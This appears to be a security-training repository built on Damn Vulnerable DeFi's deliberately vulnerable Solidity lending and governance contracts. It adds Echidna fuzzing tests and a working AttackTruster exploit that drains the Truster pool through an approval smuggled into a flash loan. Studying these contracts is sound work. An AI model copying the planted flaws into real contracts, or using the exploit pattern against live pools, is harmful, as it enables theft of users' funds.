    | import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | import "./SimpleGovernance.sol";
    | 
    | /**
    |  * @title SelfiePool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract SelfiePool is ReentrancyGuard {
    | 
    |     using Address for address;
    | 
    |     ERC20Snapshot public token;
    |     SimpleGovernance public governance;
    | 
    |     event FundsDrained(address indexed receiver, uint256 amount);
    | 
    |     modifier onlyGovernance() {
    |         require(msg.sender == address(governance), "Only governance can execute this action");
    |         _;
    |     }
    | 
    |     constructor(address tokenAddress, address governanceAddress) {
    |         token = ERC20Snapshot(tokenAddress);
    |         governance = SimpleGovernance(governanceAddress);
    |     }
    | 
    |     function flashLoan(uint256 borrowAmount) external nonReentrant {
    |         uint256 balanceBefore = token.balanceOf(address(this));
    |         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
    |         
    |         token.transfer(msg.sender, borrowAmount);        
    |         
    |         require(msg.sender.isContract(), "Sender must be a deployed contract");
    |         msg.sender.functionCall(
    |             abi.encodeWithSignature(
    |                 "receiveTokens(address,uint256)",
    |                 address(token),
    |                 borrowAmount
    |             )
    |         );
    |         
    |         uint256 balanceAfter = token.balanceOf(address(this));
    | 
    |         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    |     }
    | 
    |     function drainAllFunds(address receiver) external onlyGovernance {
    |         uint256 amount = token.balanceOf(address(this));
    |         token.transfer(receiver, amount);
    |         
    |         emit FundsDrained(receiver, amount);
    |     }
    | }

/src/contracts/selfie/SimpleGovernance.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "../DamnValuableTokenSnapshot.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | 
    | /**
    |  * @title SimpleGovernance
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract SimpleGovernance {
    | 
    |     using Address for address;
    |     
    |     struct GovernanceAction {
    |         address receiver;
    |         bytes data;
    |         uint256 weiAmount;
    |         uint256 proposedAt;
    |         uint256 executedAt;
    |     }
    |     
    |     DamnValuableTokenSnapshot public governanceToken;
    | 
    |     mapping(uint256 => GovernanceAction) public actions;
    |     uint256 private actionCounter;
    |     uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
    | 
    |     event ActionQueued(uint256 actionId, address indexed caller);
    |     event ActionExecuted(uint256 actionId, address indexed caller);
    | 
    |     constructor(address governanceTokenAddress) {
    |         require(governanceTokenAddress != address(0), "Governance token cannot be zero address");
    |         governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
    |         actionCounter = 1;
    |     }
    |     
    |     function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
    |         require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
    |         require(receiver != address(this), "Cannot queue actions that affect Governance");
    | 
    |         uint256 actionId = actionCounter;
    | 
    |         GovernanceAction storage actionToQueue = actions[actionId];
    |         actionToQueue.receiver = receiver;
    |         actionToQueue.weiAmount = weiAmount;
    |         actionToQueue.data = data;
    |         actionToQueue.proposedAt = block.timestamp;
    | 
    |         actionCounter++;
    | 
    |         emit ActionQueued(actionId, msg.sender);
    |         return actionId;
    |     }
    | 
    |     function executeAction(uint256 actionId) external payable {
    |         require(_canBeExecuted(actionId), "Cannot execute this action");
    |         
    |         GovernanceAction storage actionToExecute = actions[actionId];
    |         actionToExecute.executedAt = block.timestamp;
    | 
    |         actionToExecute.receiver.functionCallWithValue(
    |             actionToExecute.data,
    |             actionToExecute.weiAmount
    |         );
    | 
    |         emit ActionExecuted(actionId, msg.sender);
    |     }
    | 
    |     function getActionDelay() public view returns (uint256) {
    |         return ACTION_DELAY_IN_SECONDS;
    |     }
    | 
    |     /**
    |      * @dev an action can only be executed if:
    |      * 1) it's never been executed before and
    |      * 2) enough time has passed since it was first proposed
    |      */
    |     function _canBeExecuted(uint256 actionId) private view returns (bool) {
    |         GovernanceAction memory actionToExecute = actions[actionId];
    |         return (
    |             actionToExecute.executedAt == 0 &&
    |             (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
    |         );
    |     }
    |     
    |     function _hasEnoughVotes(address account) private view returns (bool) {
    |         uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
    |         uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
    |         return balance > halfTotalSupply;
    |     }
    | }
    | 

/src/contracts/side-entrance/SideEntranceLenderPool.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | import "@openzeppelin/contracts/utils/Address.sol";
    | 
    | interface IFlashLoanEtherReceiver {
    |     function execute() external payable;
    | }
    | 
    | /**
    |  * @title SideEntranceLenderPool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract SideEntranceLenderPool {
    |     using Address for address payable;
    | 
    |     mapping (address => uint256) private balances;
    | 
    |     function deposit() external payable {
    |         balances[msg.sender] += msg.value;
    |     }
    | 
    |     function withdraw() external {
    |         uint256 amountToWithdraw = balances[msg.sender];
    |         balances[msg.sender] = 0;
    |         payable(msg.sender).sendValue(amountToWithdraw);
    |     }
    | 
    |     function flashLoan(uint256 amount) external {
    |         uint256 balanceBefore = address(this).balance;
    |         require(balanceBefore >= amount, "Not enough ETH in balance");
    |         
    |         IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    | 
    |         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    |     }
    | }
    |  

/src/contracts/the-rewarder/AccountingToken.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
    | import "@openzeppelin/contracts/access/AccessControl.sol";
    | 
    | /**
    |  * @title AccountingToken
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  * @notice A limited pseudo-ERC20 token to keep track of deposits and withdrawals
    |  *         with snapshotting capabilities
    |  */
    | contract AccountingToken is ERC20Snapshot, AccessControl {
    | 
    |     bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    |     bytes32 public constant SNAPSHOT_ROLE = keccak256("SNAPSHOT_ROLE");
    |     bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");
    | 
    |     constructor() ERC20("rToken", "rTKN") {
    |         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
    |         _setupRole(MINTER_ROLE, msg.sender);
    |         _setupRole(SNAPSHOT_ROLE, msg.sender);
    |         _setupRole(BURNER_ROLE, msg.sender);
    |     }
    | 
    |     function mint(address to, uint256 amount) external {
    |         require(hasRole(MINTER_ROLE, msg.sender), "Forbidden");
    |         _mint(to, amount);
    |     }
    | 
    |     function burn(address from, uint256 amount) external {
    |         require(hasRole(BURNER_ROLE, msg.sender), "Forbidden");
    |         _burn(from, amount);
    |     }
    | 
    |     function snapshot() external returns (uint256) {
    |         require(hasRole(SNAPSHOT_ROLE, msg.sender), "Forbidden");
    |         return _snapshot();
    |     }
    | 
    |     // Do not need transfer of this token
    |     // TODO: commented out for echidna learning purposes
    |     // function _transfer(address, address, uint256) internal pure override {
    |     //     revert("Not implemented");
    |     // }
    | 
    |     // Do not need allowance of this token
    |     function _approve(address, address, uint256) internal pure override {
    |         revert("Not implemented");
    |     }
    | }

/src/contracts/the-rewarder/FlashLoanerPool.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | import "../DamnValuableToken.sol";
    | 
    | /**
    |  * @title FlashLoanerPool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    | 
    |  * @dev A simple pool to get flash loans of DVT
    |  */
    | contract FlashLoanerPool is ReentrancyGuard {
    | 
    |     using Address for address;
    | 
    |     DamnValuableToken public immutable liquidityToken;
    | 
    |     constructor(address liquidityTokenAddress) {
    |         liquidityToken = DamnValuableToken(liquidityTokenAddress);
    |     }
    | 
    |     function flashLoan(uint256 amount) external nonReentrant {
    |         uint256 balanceBefore = liquidityToken.balanceOf(address(this));
    |         require(amount <= balanceBefore, "Not enough token balance");
    | 
    |         require(msg.sender.isContract(), "Borrower must be a deployed contract");
    |         
    |         liquidityToken.transfer(msg.sender, amount);
    | 
    |         msg.sender.functionCall(
    |             abi.encodeWithSignature(
    |                 "receiveFlashLoan(uint256)",
    |                 amount
    |             )
    |         );
    | 
    |         require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    |     }
    | }

/src/contracts/the-rewarder/RewardToken.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    | import "@openzeppelin/contracts/access/AccessControl.sol";
    | 
    | /**
    |  * @title RewardToken
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  * @dev A mintable ERC20 with 2 decimals to issue rewards
    |  */
    | contract RewardToken is ERC20, AccessControl {
    | 
    |     bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    | 
    |     constructor() ERC20("Reward Token", "RWT") {
    |         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
    |         _setupRole(MINTER_ROLE, msg.sender);
    |     }
    | 
    |     function mint(address to, uint256 amount) external {
    |         require(hasRole(MINTER_ROLE, msg.sender));
    |         _mint(to, amount);
    |     }
    | }
    | 

/src/contracts/the-rewarder/TheRewarderPool.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "./RewardToken.sol";
    | import "../DamnValuableToken.sol";
    | import "./AccountingToken.sol";
    | 
    | /**
    |  * @title TheRewarderPool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    | 
    |  */
    | contract TheRewarderPool {
    | 
    |     // Minimum duration of each round of rewards in seconds
    |     uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
    | 
    |     uint256 public lastSnapshotIdForRewards;
    |     uint256 public lastRecordedSnapshotTimestamp;
    | 
    |     mapping(address => uint256) public lastRewardTimestamps;
    | 
    |     // Token deposited into the pool by users
    |     DamnValuableToken public immutable liquidityToken;
    | 
    |     // Token used for internal accounting and snapshots
    |     // Pegged 1:1 with the liquidity token
    |     AccountingToken public accToken;
    |     
    |     // Token in which rewards are issued
    |     RewardToken public immutable rewardToken;
    | 
    |     // Track number of rounds
    |     uint256 public roundNumber;
    | 
    |     constructor(address tokenAddress) {
    |         // Assuming all three tokens have 18 decimals
    |         liquidityToken = DamnValuableToken(tokenAddress);
    |         accToken = new AccountingToken();
    |         rewardToken = new RewardToken();
    | 
    |         _recordSnapshot();
    |     }
    | 
    |     /**
    |      * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
    |      */
    |     function deposit(uint256 amountToDeposit) external {
    |         require(amountToDeposit > 0, "Must deposit tokens");
    |         
    |         accToken.mint(msg.sender, amountToDeposit);
    |         distributeRewards();
    | 
    |         require(
    |             liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
    |         );
    |     }
    | 
    |     function withdraw(uint256 amountToWithdraw) external {
    |         accToken.burn(msg.sender, amountToWithdraw);
    |         require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    |     }
    | 
    |     function distributeRewards() public returns (uint256) {
    |         uint256 rewards = 0;
    | 
    |         if(isNewRewardsRound()) {
    |             _recordSnapshot();
    |         }        
    |         
    |         uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
    |         uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
    | 
    |         if (amountDeposited > 0 && totalDeposits > 0) {
    |             rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
    | 
    |             if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
    |                 rewardToken.mint(msg.sender, rewards);
    |                 lastRewardTimestamps[msg.sender] = block.timestamp;
    |             }
    |         }
    | 
    |         return rewards;     
    |     }
    | 
    |     function _recordSnapshot() private {
    |         lastSnapshotIdForRewards = accToken.snapshot();
    |         lastRecordedSnapshotTimestamp = block.timestamp;
    |         roundNumber++;
    |     }
    | 
    |     function _hasRetrievedReward(address account) private view returns (bool) {
    |         return (
    |             lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
    |             lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
    |         );
    |     }
    | 
    |     function isNewRewardsRound() public view returns (bool) {
    |         return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    |     }
    | }
    | 

/src/contracts/truster/AttackTruster.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    | import "./ITrusterLenderPool.sol";
    | 
    | import "hardhat/console.sol";
    | 
    | contract AttackTruster {
    |     constructor() {}
    | 
    |     function attackTruster(
    |         IERC20 token,
    |         ITrusterLenderPool pool,
    |         address attacker
    |     ) public {
    |         // get balance of the truster lender pool
    |         uint256 poolBalance = token.balanceOf(address(pool));
    |         console.log("poolBalance: ", poolBalance);
    |         // create payload -> approve this contract which will call the transferFrom
    |         bytes memory approvePayload = abi.encodeWithSignature(
    |             "approve(address,uint256)",
    |             address(this),
    |             poolBalance
    |         );
    |         console.log("approvePayload: ");
    |         console.logBytes(approvePayload);
    |         // loan 0 tokens to an attacker account and create approval on
    |         // token contract
    |         pool.flashLoan(0, attacker, address(token), approvePayload);
    |         // and transfer approved tokens to attacker's EOA
    |         token.transferFrom(address(pool), attacker, poolBalance);
    |     }
    | }
    | 

/src/contracts/truster/EchidnaDVToken.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    | 
    | /**
    |  * @title DamnValuableToken
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
*r  |  */
    | contract EchidnaDVToken is ERC20 {
    |     // Decimals are set to 18 by default in `ERC20`
    |     constructor() ERC20("EchidnaDamnValuableToken", "EDVT") {
    |         _mint(msg.sender, type(uint256).max);
    |     }
    | }
    | 

/src/contracts/truster/EchidnaTestTrusterLenderPool.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    | import "./EchidnaDVToken.sol";
    | import "./TrusterLenderPool.sol";
    | import "./ITrusterLenderPool.sol";
    | 
    | /**
    |  * @dev run in docker:
    |  * npx hardhat clean && npx hardhat compile --force && echidna-test /src --contract EchidnaTestTrusterLenderPool --config /src/contracts/truster/config.yaml
    |  */
*r  | 
    | contract EchidnaTestTrusterLenderPool {
r   |     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
    | 
*   |     ERC20 public token;
*   |     TrusterLenderPool public pool;
    | 
    |     event AssertionFailed(string reason, uint256 balance);
    | 
    |     address echidna_caller = msg.sender;
    | 
    |     // Echidna setup
    |     constructor() {
    |         // deploy token
    |         token = new EchidnaDVToken();
    |         // deploy pool
    |         pool = new TrusterLenderPool(address(token));
    |         // deposit tokens into the pool
    |         token.transfer(address(pool), TOKENS_IN_POOL);
    |     }
    | 
    |     // @note if function's name uses `echidna` word (for instance: test_echidna_contract_balance), it fails because of
    |     // "test_echidna_contract_balance has arguments, aborting"
r   |     function test_contract_balance(uint256 borrowAmount) public {
    |         // pre: check the initial balance
r   |         uint256 poolBalanceBefore = token.balanceOf(address(pool));
r   |         require(poolBalanceBefore == 1_000_000 ether);
    | 
r   |         bytes memory approvePayload = abi.encodeWithSignature(
    |             "approve(address,uint256)",
r   |             address(this),
r   |             poolBalanceBefore
    |         );
    | 
r   |         pool.flashLoan(
r   |             borrowAmount,
r   |             msg.sender,
r   |             address(token),
r   |             approvePayload
    |         );
    |         // try to withdraw tokens from the pool
r   |         try token.transferFrom(address(pool), msg.sender, poolBalanceBefore) {
    |             /* not reverted */
    |         } catch {
    |             assert(false);
    |         }
r   |         uint256 poolBalanceAfter = token.balanceOf(address(pool));
    |         // using assertion event
r   |         if (poolBalanceBefore != poolBalanceAfter) {
r   |             emit AssertionFailed("Pool Balance Decreased", poolBalanceAfter);
    |         }
    |         // using assert
r   |         assert(token.balanceOf(address(pool)) >= TOKENS_IN_POOL);
    |     }
    | }
    | 

/src/contracts/truster/ITrusterLenderPool.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | interface ITrusterLenderPool {
    |     function flashLoan(
    |         uint256 borrowAmount,
    |         address borrower,
    |         address target,
    |         bytes calldata data
    |     ) external;
    | }
    | 

/src/contracts/truster/TrusterLenderPool.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    | import "@openzeppelin/contracts/utils/Address.sol";
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | 
    | /**
    |  * @title TrusterLenderPool
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
*r  |  */
    | contract TrusterLenderPool is ReentrancyGuard {
    | 
    |     using Address for address;
    | 
*   |     IERC20 public immutable damnValuableToken;
    | 
    |     constructor (address tokenAddress) {
    |         damnValuableToken = IERC20(tokenAddress);
    |     }
    | 
r   |     function flashLoan(
    |         uint256 borrowAmount,
    |         address borrower,
    |         address target,
    |         bytes calldata data
    |     )
    |         external
    |         nonReentrant
r   |     {
r   |         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
r   |         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
    |         
r   |         damnValuableToken.transfer(borrower, borrowAmount);
r   |         target.functionCall(data);
    | 
r   |         uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
r   |         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    |     }
    | 
    | }
    | 

/src/contracts/unstoppable/ReceiverUnstoppable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../unstoppable/UnstoppableLender.sol";
    | import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    | 
    | /**
    |  * @title ReceiverUnstoppable
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract ReceiverUnstoppable {
    | 
    |     UnstoppableLender private immutable pool;
    |     address private immutable owner;
    | 
    |     constructor(address poolAddress) {
    |         pool = UnstoppableLender(poolAddress);
    |         owner = msg.sender;
    |     }
    | 
    |     // Pool will call this function during the flash loan
    |     function receiveTokens(address tokenAddress, uint256 amount) external {
    |         require(msg.sender == address(pool), "Sender must be pool");
    |         // Return all tokens to the pool
    |         require(IERC20(tokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
    |     }
    | 
    |     function executeFlashLoan(uint256 amount) external {
    |         require(msg.sender == owner, "Only owner can execute flash loan");
    |         pool.flashLoan(amount);
    |     }
    | }

/src/contracts/unstoppable/UnstoppableEchidna.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /* @dev import paths changed because
    |  */
    | import "../DamnValuableToken.sol";
    | import "./ReceiverUnstoppable.sol";
    | import "./UnstoppableLender.sol"; // a lending pool
    | 
    | /**
    |  * @dev to run this contract, use:
    |  * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract UnstoppableEchidna --multi-abi --config contracts/unstoppable/config.yaml
    |  */
    | contract UnstoppableEchidna {
    |     // We will send ETHER_IN_POOL to the flash loan pool.
    |     uint256 constant ETHER_IN_POOL = 1000000e18;
    |     // We will send INITIAL_ATTACKER_BALANCE to the attacker (which is the deployer) of this contract.
    |     uint256 constant INITIAL_ATTACKER_BALANCE = 100e18;
    | 
    |     DamnValuableToken token;
    |     UnstoppableLender pool;
    | 
    |     constructor() payable {
    |         token = new DamnValuableToken();
    |         // deploy the flash loan pool
    |         pool = new UnstoppableLender(address(token));
    |         // approve tokens for their transfer to the pool
    |         token.approve(address(pool), ETHER_IN_POOL);
    |         // deposit approved tokens into the pool
    |         pool.depositTokens(ETHER_IN_POOL);
    |         // send the attacker some tokens
    |         token.transfer(msg.sender, INITIAL_ATTACKER_BALANCE);
    |     }
    | 
    |     // this is callback function which is inside the pool.flashloan(uint256 borrowAmount)
    |     function receiveTokens(address tokenAddress, uint256 amount) external {
    |         require(msg.sender == address(pool), "Sender must be the pool!");
    |         // return all tokens to the pool
    |         require(
    |             // this function will break the UnstoppableLender contract as the
    |             // poolBalance does not update if transfer() is called
    |             IERC20(tokenAddress).transfer(msg.sender, amount),
    |             "Token Transfer failed"
    |         );
    |     }
    | 
    |     // This is the Echidna property entrypoint.
    |     // We want to test whether flash loans can always be made.
    |     function echidna_testFlashLoan() public returns (bool) {
    |         pool.flashLoan(10);
    |         return true;
    |     }
    | }
    | 

/src/contracts/unstoppable/UnstoppableLender.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    | import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    | 
    | interface IReceiver {
    |     function receiveTokens(address tokenAddress, uint256 amount) external;
    | }
    | 
    | /**
    |  * @title UnstoppableLender
    |  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
    |  */
    | contract UnstoppableLender is ReentrancyGuard {
    | 
    |     IERC20 public immutable damnValuableToken;
    |     uint256 public poolBalance;
    | 
    |     constructor(address tokenAddress) {
    |         require(tokenAddress != address(0), "Token address cannot be zero");
    |         damnValuableToken = IERC20(tokenAddress);
    |     }
    | 
    |     function depositTokens(uint256 amount) external nonReentrant {
    |         require(amount > 0, "Must deposit at least one token");
    |         // Transfer token from sender. Sender must have first approved them.
    |         damnValuableToken.transferFrom(msg.sender, address(this), amount);
    |         poolBalance = poolBalance + amount;
    |     }
    | 
    |     function flashLoan(uint256 borrowAmount) external nonReentrant {
    |         require(borrowAmount > 0, "Must borrow at least one token");
    | 
    |         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    |         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
    | 
    |         // Ensured by the protocol via the `depositTokens` function
    |         assert(poolBalance == balanceBefore);
    |         
    |         damnValuableToken.transfer(msg.sender, borrowAmount);
    |         
    |         IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
    |         
    |         uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    |         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    |     }
    | }
    | 

/src/node_modules/hardhat/console.sol
    | // SPDX-License-Identifier: MIT
    | pragma solidity >= 0.4.22 <0.9.0;
    | 
    | library console {
    | 	address constant CONSOLE_ADDRESS = address(0x000000000000000000636F6e736F6c652e6c6f67);
    | 
    | 	function _sendLogPayload(bytes memory payload) private view {
    | 		uint256 payloadLength = payload.length;
    | 		address consoleAddress = CONSOLE_ADDRESS;
    | 		assembly {
    | 			let payloadStart := add(payload, 32)
    | 			let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0)
    | 		}
    | 	}
    | 
    | 	function log() internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log()"));
    | 	}
    | 
    | 	function logInt(int p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(int)", p0));
    | 	}
    | 
    | 	function logUint(uint p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint)", p0));
    | 	}
    | 
    | 	function logString(string memory p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string)", p0));
    | 	}
    | 
    | 	function logBool(bool p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool)", p0));
    | 	}
    | 
    | 	function logAddress(address p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address)", p0));
    | 	}
    | 
    | 	function logBytes(bytes memory p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes)", p0));
    | 	}
    | 
    | 	function logBytes1(bytes1 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes1)", p0));
    | 	}
    | 
    | 	function logBytes2(bytes2 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes2)", p0));
    | 	}
    | 
    | 	function logBytes3(bytes3 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes3)", p0));
    | 	}
    | 
    | 	function logBytes4(bytes4 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes4)", p0));
    | 	}
    | 
    | 	function logBytes5(bytes5 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes5)", p0));
    | 	}
    | 
    | 	function logBytes6(bytes6 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes6)", p0));
    | 	}
    | 
    | 	function logBytes7(bytes7 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes7)", p0));
    | 	}
    | 
    | 	function logBytes8(bytes8 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes8)", p0));
    | 	}
    | 
    | 	function logBytes9(bytes9 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes9)", p0));
    | 	}
    | 
    | 	function logBytes10(bytes10 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes10)", p0));
    | 	}
    | 
    | 	function logBytes11(bytes11 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes11)", p0));
    | 	}
    | 
    | 	function logBytes12(bytes12 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes12)", p0));
    | 	}
    | 
    | 	function logBytes13(bytes13 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes13)", p0));
    | 	}
    | 
    | 	function logBytes14(bytes14 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes14)", p0));
    | 	}
    | 
    | 	function logBytes15(bytes15 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes15)", p0));
    | 	}
    | 
    | 	function logBytes16(bytes16 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes16)", p0));
    | 	}
    | 
    | 	function logBytes17(bytes17 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes17)", p0));
    | 	}
    | 
    | 	function logBytes18(bytes18 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes18)", p0));
    | 	}
    | 
    | 	function logBytes19(bytes19 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes19)", p0));
    | 	}
    | 
    | 	function logBytes20(bytes20 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes20)", p0));
    | 	}
    | 
    | 	function logBytes21(bytes21 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes21)", p0));
    | 	}
    | 
    | 	function logBytes22(bytes22 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes22)", p0));
    | 	}
    | 
    | 	function logBytes23(bytes23 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes23)", p0));
    | 	}
    | 
    | 	function logBytes24(bytes24 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes24)", p0));
    | 	}
    | 
    | 	function logBytes25(bytes25 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes25)", p0));
    | 	}
    | 
    | 	function logBytes26(bytes26 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes26)", p0));
    | 	}
    | 
    | 	function logBytes27(bytes27 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes27)", p0));
    | 	}
    | 
    | 	function logBytes28(bytes28 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes28)", p0));
    | 	}
    | 
    | 	function logBytes29(bytes29 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes29)", p0));
    | 	}
    | 
    | 	function logBytes30(bytes30 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes30)", p0));
    | 	}
    | 
    | 	function logBytes31(bytes31 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes31)", p0));
    | 	}
    | 
    | 	function logBytes32(bytes32 p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bytes32)", p0));
    | 	}
    | 
    | 	function log(uint p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint)", p0));
    | 	}
    | 
    | 	function log(string memory p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(string)", p0));
    | 	}
    | 
    | 	function log(bool p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(bool)", p0));
    | 	}
    | 
    | 	function log(address p0) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(address)", p0));
    | 	}
    | 
    | 	function log(uint p0, uint p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,uint)", p0, p1));
    | 	}
    | 
    | 	function log(uint p0, string memory p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,string)", p0, p1));
    | 	}
    | 
    | 	function log(uint p0, bool p1) internal view {
    | 		_sendLogPayload(abi.encodeWithSignature("log(uint,bool)", p0, p1));
    | 	}
    | 
